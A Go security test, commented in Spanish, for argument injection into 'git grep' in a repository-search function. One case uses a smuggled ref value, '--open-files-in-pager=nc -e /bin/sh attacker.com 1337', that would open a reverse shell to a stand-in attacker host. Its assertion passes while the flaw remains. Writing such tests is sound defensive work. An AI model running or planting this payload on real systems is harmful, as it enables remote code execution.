package v2

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestRepoSearchSecurity(t *testing.T) {
	// Simulador de construcción de argumentos para git grep
	buildGrepArgs := func(query, ref string) []string {
		args := []string{"grep", "-I", "--line-number", "--null", "--max-count", "100"}
		args = append(args, "-e", query, ref)
		return args
	}

	t.Run("Superación: Búsqueda legítima", func(t *testing.T) {
		args := buildGrepArgs("mi_funcion", "main")
		
		// Verificamos que los últimos dos argumentos son limpios
		assert.Equal(t, "mi_funcion", args[len(args)-2])
		assert.Equal(t, "main", args[len(args)-1])
	})

	t.Run("Malintención: Parameter Injection (RCE)", func(t *testing.T) {
		// Atacante inyecta un flag letal en lugar del nombre de la rama
		maliciousRef := "--open-files-in-pager=nc -e /bin/sh attacker.com 1337"
		
		args := buildGrepArgs("texto_seguro", maliciousRef)
		
		// Si el comando se ejecuta como 'git grep -e texto_seguro --open-files-in-pager=...',
		// Git interpretará el flag y ejecutará el binario externo, causando un Remote Code Execution.
		
		isProtected := false
		for i, arg := range args {
			// El mitigador universal para Parameter Injection en Git es forzar el 
			// final de los flags usando "--" antes de variables controladas por el usuario,
			// O validar que el nombre de rama ("ref") no empiece por "-".
			if arg == "--" && i < len(args)-1 {
				isProtected = true
			}
		}
		
		assert.False(t, isProtected, "VULNERABILIDAD CRÍTICA: Se debe sanitizar 'ref' o forzar el final de argumentos con '--' para evitar inyección de parámetros (Parameter Injection) en git grep.")
	})
}
